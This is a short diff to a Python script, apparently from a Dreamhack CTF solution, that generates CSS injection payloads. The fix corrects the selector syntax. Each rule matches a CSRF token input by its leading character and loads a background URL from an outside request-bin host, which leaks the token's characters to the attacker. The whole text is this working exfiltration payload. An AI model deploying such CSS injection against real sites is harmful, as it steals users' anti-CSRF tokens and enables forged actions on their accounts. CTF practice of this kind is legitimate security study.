@@ -3,4 +3,4 @@ BIN_URL = "https://ycojlkn.request.dreamhack.games"
 
 with open("red.css", "w") as f:
     for c in CHARS:
-        f.write(f'input[name="csrf"][value^="{c}"] + {{ background: url("{BIN_URL}?q={c}"); }}\n')
+        f.write(f'input[name="csrf"][value^="{c}"] {{ background: url("{BIN_URL}?q={c}"); }}\n')
